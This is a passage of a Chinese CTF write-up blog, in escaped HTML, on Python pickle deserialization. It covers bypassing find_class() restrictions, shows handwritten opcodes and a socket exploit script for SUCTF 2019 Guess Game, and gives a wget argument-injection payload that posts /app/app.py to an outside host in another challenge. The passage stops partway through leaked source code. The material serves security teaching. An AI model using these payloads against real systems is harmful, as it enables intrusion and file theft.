&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[module]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[callable]&amp;#39;&lt;/span>&lt;span style="color:#111">)[,&lt;/span> &lt;span style="color:#111">param0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">param1&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>实例化对象（特殊的函数执行）&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">animal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;span style="color:#111">animal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>先对题目有大概思路，然后辅以工具~好耶&lt;/p>
&lt;h3 id="工具二连---uanapickleuhttpsgithubcomsensepostanapickle">工具二连 - &lt;a href="https://github.com/sensepost/anapickle">&lt;u>anapickle&lt;/u>&lt;/a>&lt;/h3>
&lt;p>其实一个年龄很大的脚本了，支持python2.3。。。。但是包含了很多payload，可以灵活运用~&lt;/p>
&lt;h2 id="bypass">bypass!!!&lt;/h2>
&lt;h3 id="对类型的检查">对类型的检查&lt;/h3>
&lt;p>可以在已经构造好的opcode后面去掉&lt;code>.&lt;/code>再续上相应的对象的opcode，作为栈顶的值供检查&lt;/p>
&lt;h3 id="限制bc对模块的引入---find_class的重写">限制&lt;code>b'c'&lt;/code>对模块的引入 - &lt;code>find_class()&lt;/code>的重写&lt;/h3>
&lt;p>修改&lt;code>find_class()&lt;/code>会引入函数&amp;amp;模块的白名单，一定程度上解决pickle的安全性问题；以下两种情况会调用&lt;code>find_class()&lt;/code>的检查：&lt;/p>
&lt;ul>
&lt;li>opcode角度：出现&lt;code>c&lt;/code>, &lt;code>i&lt;/code>, &lt;code>b'\x93'&lt;/code>会调用&lt;/li>
&lt;li>python角度：find_class()只会在解析opcode时调用一次，只要绕过opcode的执行过程，之后再产生的函数在黑名单中也不会拦截（比如通过&lt;code>__import__&lt;/code>来绕过）&lt;/li>
&lt;/ul>
&lt;h3 id="--仅可以引入__main__开头的模块">&amp;ndash;&amp;raquo;仅可以引入&lt;code>__main__&lt;/code>开头的模块&lt;/h3>
&lt;p>“通过GLOBAL指令引入的变量可以看作是原变量的引用，我们在栈上修改它的值，也会修改原变量”，基于这一原理，当&lt;code>c&lt;/code>指令只允许&lt;code>__main__&lt;/code>时，我们可以引入&lt;code>__main__.blue&lt;/code>（blue见题行事 上下文中会提前引入）这个module，再将一个dict压入栈，内容是&lt;code>{'name': 'rua', 'grade': 'www'}&lt;/code>；之后执行BUILD指令，将会改写&lt;code>__main__.blue.name&lt;/code>和 &lt;code>__main__.blue.grade&lt;/code>，此时已经执行了我们想要的变量覆盖。之后弹掉栈顶，现在为空栈，拼接上正常的Student对象序列化后的opcode。此时的完整opcode在被反序列化时，栈顶是正常的Student对象，而被执行时却会先执行一遍前面的过程，造成变量覆盖。&lt;/p>
&lt;p>既然我们可以做到重写变量的值，那也可以将这个值改为read wrapper的返回值做到任意文件读取（详见后面的内容）&lt;/p>
&lt;h3 id="--仅可以引入题目中自设的模块模块名不能有__符">&amp;ndash;&amp;raquo;仅可以引入题目中自设的模块&amp;amp;模块名不能有&lt;code>__&lt;/code>符&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子2 - [SUCTF 2019]Guess Game
&lt;/h4>
&lt;/summary>
&lt;p>本地复现还是失败，无解，docker地址-&amp;gt;https://github.com/rmb122/suctf2019_guess_game&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809115950444.png" alt="image-20210809115950444">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130400358.png" alt="image-20210809130400358">&lt;/p>
&lt;p>是个猜数游戏，交互逻辑在init.py, Game.py和Ticket.py中，10以内的数字需要猜对10次（全胜）才会返回flag&lt;/p>
&lt;p>然后是game_client.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130523878.png" alt="image-20210809130523878">&lt;/p>
&lt;p>接收数字的输入作为参数生成Ticket对象，序列化后发送到server端&lt;/p>
&lt;p>再看game_server.py，用了重写了的&lt;code>find_class()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130933730.png" alt="image-20210809130933730">&lt;/p>
&lt;p>这个限制的意思是导入的模块只能以guess_name开头并且名字里没有&lt;code>__&lt;/code>&lt;/p>
&lt;p>大概看完了流程，接下来找找突破口——序列化时是生成一个Ticket的实例&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132300981.png" alt="image-20210809132300981">&lt;/p>
&lt;p>判断输赢则是需要Game辅助&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132437175.png" alt="image-20210809132437175">&lt;/p>
&lt;p>结合game_server.py的判断条件，拿到flag需要&lt;code>self.win_count == max_round == 10&lt;/code>&lt;/p>
&lt;p>那么构造的方向有了——修改相关参数做到变量覆盖，再以序列化的opcode形式传过去。手写opcode面临的问题就是重写&lt;code>find_class()&lt;/code>后对加载指定模块的限制，而这里我们可以看到&lt;code>__init__.py&lt;/code>中&lt;code>game = Game()&lt;/code>，所以直接可以通过&lt;code>guess_game.game&lt;/code>引入&lt;code>Game()&lt;/code>类，然后修改类中的win_count和round_count就能做到变量覆盖；第二要注意必须手写opcode，如果是先&lt;code>from guess_name import game&lt;/code>，然后修改参数后再dump，则是在运行时重新新建一个Game对象，就不是从guess_game这个module中获取，破坏上下文；第三要注意&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809140423900.png" alt="image-20210809140423900">&lt;/p>
&lt;p>pickle序列化流执行完会把栈顶的值返回，所以栈顶需要设为Ticket，这里可以dumps一个Ticket，然后拼到之前手写的opcode之后&lt;/p>
&lt;p>opcodes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 修改win_count = 10和round_count = 9，传过去之后执行一次round_count += 1就能全胜&lt;/span>
&lt;span style="color:#111">cguess_name&lt;/span>
&lt;span style="color:#111">game&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#34;win_count&amp;#34;&lt;/span>
&lt;span style="color:#111">I10&lt;/span>
&lt;span style="color:#111">sS&lt;/span>&lt;span style="color:#d88200">&amp;#34;round_count&amp;#34;&lt;/span>
&lt;span style="color:#111">I9&lt;/span>
&lt;span style="color:#111">sbcguess_game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Ticket&lt;/span>\&lt;span style="color:#111">nTicket&lt;/span>\&lt;span style="color:#111">nq&lt;/span>\&lt;span style="color:#111">x00&lt;/span>&lt;span style="color:#111">)&lt;/span>\&lt;span style="color:#111">x81q&lt;/span>\&lt;span style="color:#111">x01&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>\&lt;span style="color:#111">x02X&lt;/span>\&lt;span style="color:#111">x06&lt;/span>\&lt;span style="color:#111">x00&lt;/span>\&lt;span style="color:#111">x00&lt;/span>\&lt;span style="color:#111">x00numberq&lt;/span>\&lt;span style="color:#111">x03K&lt;/span>\&lt;span style="color:#111">x06sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#75715e"># c之后是被find_class()监控的区域，拼接Ticket&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;node4.buuoj.cn&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">28803&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">exp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;cguess_game
&lt;/span>&lt;span style="color:#d88200">game
&lt;/span>&lt;span style="color:#d88200">}S&amp;#34;win_count&amp;#34;
&lt;/span>&lt;span style="color:#d88200">I10
&lt;/span>&lt;span style="color:#d88200">sS&amp;#34;round_count&amp;#34;
&lt;/span>&lt;span style="color:#d88200">I9
&lt;/span>&lt;span style="color:#d88200">sbcguess_game.Ticket&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Ticket&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x06\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">numberq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">sb.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;I&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809144613834.png" alt="image-20210809144613834">&lt;/p>
&lt;p>————用pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game.Ticket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ticket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">game&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;game&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">curr_ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ticket&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ticket&lt;/span>
&lt;span style="color:#75715e"># b&amp;#34;(I0\niguess_game.Ticket\nTicket\np0\n0cguess_game\ngame\np1\n0g1\n(N(S&amp;#39;curr_ticket&amp;#39;\ng0\ndtbg0\n.&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子3 - [巅峰极客 2021]what_pickle
&lt;/h4>
&lt;/summary>
&lt;p>登录页面 任意密码均可登入，仅显示一张图片+登录时输入的密码；图片的url为/images?image=2.jpg，但是不能常规的目录穿越拿源码，当时做的时候就不会了，下面是复现&lt;/p>
&lt;p>/images可以看到开着的debug界面&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024174438862.png" alt="image-20211024174438862">&lt;/p>
&lt;p>能看到部分的源码，这里的图片是用的wget命令来下载本地8080端口的/image图片，所以我们尝试wget命令注入将文件外带出来&lt;/p>
&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=--post-file=/app/app.py&amp;amp;argv=--execute=http_proxy=http://ip:port
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=—post-file=/app/app.py&amp;amp;argv=-e http_proxy=http://ip:port
&lt;/code>&lt;/pre>&lt;p>依次读出/app/app.py和/app/config.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># app.py&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">redirect&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">ctypes&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cdll&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">config&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">user&lt;/span>
&lt;span style="color:#111">cdll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">LoadLibrary&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./readflag.so&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Unpickler&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;config&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;__&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">UnpicklingError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global &amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39; is forbidden&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;Helper function analogous to pickle.loads().&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/index&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">login&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
